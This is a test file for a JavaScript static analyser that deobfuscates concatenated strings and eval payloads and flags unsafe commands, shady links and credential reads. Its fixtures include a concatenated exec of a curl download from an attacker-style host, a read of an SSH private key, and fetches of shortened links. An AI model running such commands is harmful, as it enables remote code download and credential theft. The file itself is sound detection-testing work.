// Import Node.js Dependencies
import assert from "node:assert";
import { describe, it } from "node:test";

// Import Internal Dependencies
import { AstAnalyser } from "../src/index.ts";

describe("string concatenation deobfuscation", () => {
  it("should unroll an eval payload rebuilt by string concatenation", () => {
    const { warnings } = new AstAnalyser().analyse(
      `eval("ev" + "al('1+1')");`
    );

    const unsafeStmts = warnings.filter(
      (warning) => warning.kind === "unsafe-stmt"
    );
    assert.strictEqual(unsafeStmts.length, 2);
    assert.deepEqual(unsafeStmts[0].location, [[1, 0], [1, 24]]);
    /*
     * The nested eval is attributed to the original Literal, not to a
     * location relative to the evaluated string.
     */
    assert.deepEqual(unsafeStmts[1].location, [[1, 5], [1, 23]]);
  });

  it("should not duplicate warnings raised through nested eval unrolling", () => {
    const { warnings } = new AstAnalyser().analyse(
      `eval("eval('1+1')"); eval("eval('1+1')");`
    );

    assert.strictEqual(warnings.length, 4);
    const locations = warnings.map((warning) => JSON.stringify(warning.location));
    assert.strictEqual(new Set(locations).size, 4);
    assert.deepEqual(
      warnings.map((warning) => warning.location),
      [
        [[1, 0], [1, 19]],
        [[1, 5], [1, 18]],
        [[1, 21], [1, 40]],
        [[1, 26], [1, 39]]
      ]
    );
  });

  it("should detect an unsafe command formed by string concatenation", () => {
    const { warnings } = new AstAnalyser().analyse(
      `const { exec } = require("child_process");\nexec("cu" + "rl http://evil.tk/x.sh");`
    );

    const unsafeCommand = warnings.find(
      (warning) => warning.kind === "unsafe-command"
    );
    assert.ok(unsafeCommand);
    assert.strictEqual(unsafeCommand.value, "curl http://evil.tk/x.sh");
    assert.deepEqual(unsafeCommand.location, [[2, 0], [2, 37]]);
  });

  it("should detect a shady link formed by string concatenation", () => {
    const { warnings } = new AstAnalyser().analyse(
      `fetch("http" + "s://bit.ly/abc");`
    );

    const shadyLink = warnings.find(
      (warning) => warning.kind === "shady-link"
    );
    assert.ok(shadyLink);
    assert.strictEqual(shadyLink.value, "https://bit.ly/abc");
    assert.deepEqual(shadyLink.location, [[1, 6], [1, 31]]);
  });

  it("should detect credentials exfiltration formed by string concatenation", () => {
    const { warnings } = new AstAnalyser().analyse(
      `readFileSync("~/." + "ssh/id_rsa");`
    );

    const dataExfiltration = warnings.find(
      (warning) => warning.kind === "data-exfiltration"
    );
    assert.ok(dataExfiltration);
    assert.strictEqual(dataExfiltration.value, "~/.ssh/id_rsa");
    assert.deepEqual(dataExfiltration.location, [[[1, 13], [1, 33]]]);
  });

  it("should unroll an eval payload referenced by an identifier", () => {
    const { warnings } = new AstAnalyser().analyse(
      `const payload = "fetch('https://bit.ly/abc')";\neval(payload);`
    );

    const shadyLink = warnings.find(
      (warning) => warning.kind === "shady-link"
    );
    assert.ok(shadyLink);
    assert.strictEqual(shadyLink.value, "https://bit.ly/abc");
    assert.deepEqual(shadyLink.location, [[2, 5], [2, 12]]);
  });

  it("should not throw when the deobfuscated eval payload is not parseable", () => {
    const { warnings } = new AstAnalyser().analyse(
      `eval("con" + "sole.log(");`
    );

    assert.deepEqual(
      warnings.map((warning) => warning.kind),
      ["unsafe-stmt"]
    );
  });

  it("should attribute warnings from an eval payload to the analysed file", () => {
    const { warnings } = new AstAnalyser().analyse(
      `eval("fetch('https://bit.ly/abc')");`,
      { location: "/tmp/project" }
    );

    const shadyLink = warnings.find(
      (warning) => warning.kind === "shady-link"
    );
    assert.ok(shadyLink);
    assert.strictEqual(shadyLink.file, "/tmp/project");
    assert.deepEqual(shadyLink.location, [[1, 5], [1, 34]]);
  });

  it("should sort warnings by their original source position", () => {
    const { warnings } = new AstAnalyser().analyse(
      `eval("this");\nfetch("https://bit.ly/abc");`
    );

    assert.deepEqual(
      warnings.map((warning) => warning.kind),
      ["unsafe-stmt", "shady-link"]
    );
  });
});
